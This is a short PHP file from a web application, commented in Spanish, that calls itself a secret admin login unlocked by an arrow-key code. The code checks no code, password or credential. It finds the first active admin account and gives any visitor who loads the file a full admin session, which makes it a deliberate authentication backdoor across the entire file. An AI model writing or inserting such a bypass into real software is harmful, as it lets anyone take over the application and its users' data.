<?php
/**
 * Login secreto - Acceso directo como admin
 * ========================================
 * Este archivo se activa con el código secreto (↑→↓←)
 * e inicia sesión automáticamente como el usuario admin
 */

session_start();
require_once '../conexion.php';
require_once '../transacciones_helper.php';

// Buscar el usuario admin
$stmt = $conn->prepare("SELECT id_usuario, nombre, apellido, password, rol, activo FROM usuarios WHERE rol = 'admin' AND activo = 1 LIMIT 1");
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows === 1) {
    $usuario = $result->fetch_assoc();
    
    // Iniciar sesión
    $_SESSION['usuario_id'] = $usuario['id_usuario'];
    $_SESSION['usuario_nombre'] = $usuario['nombre'];
    $_SESSION['usuario_apellido'] = $usuario['apellido'];
    $_SESSION['usuario_rol'] = $usuario['rol'];
    $_SESSION['login_time'] = time();
    $_SESSION['secret_login'] = true; // Marcar como login secreto
    
    registrar_transaccion('login', 'Inicio de sesión secreto (código ↑→↓←)');
    
    // Redirigir al panel de admin
    header("Location: ../index.php");
    exit();
} else {
    // Si no hay admin, redirigir al login normal
    header("Location: ../login.php");
    exit();
}

$stmt->close();
$conn->close();
?>
